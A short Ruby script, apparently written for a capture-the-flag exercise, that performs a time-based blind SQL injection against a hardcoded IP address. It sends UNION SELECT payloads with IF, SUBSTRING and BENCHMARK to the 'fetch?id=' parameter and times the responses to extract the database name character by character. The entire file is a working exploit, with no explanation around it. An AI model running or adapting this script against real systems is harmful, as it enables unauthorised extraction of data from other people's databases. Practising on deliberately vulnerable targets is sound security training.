require 'net/http'
require 'cgi'
require 'benchmark'
require 'pry'

url = "35.227.24.107"
character = "abcdefghijklmnopqrstuvyxwzABCDEFGHIJKLMNOPQRSTUVYXWZ0123456789-."
result = ""
placement = 1
while 1
    for char in character.split('')
        payload = CGI.escape("1 UNION SELECT IF(SUBSTRING(database(),#{placement.to_s},1)='#{char}',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),'NO')")
        param = "/89b3f8bfae/fetch?id=#{payload}"
        time = Benchmark.measure do 
            response = Net::HTTP.get(url, param)
        end
        if time.real >= 3
            result += char
            puts "Found new char: #{result}"
            placement += 1
            break
        end
        if char == '.'
            exit
        end
        puts "Nope '#{char}'"
    end
end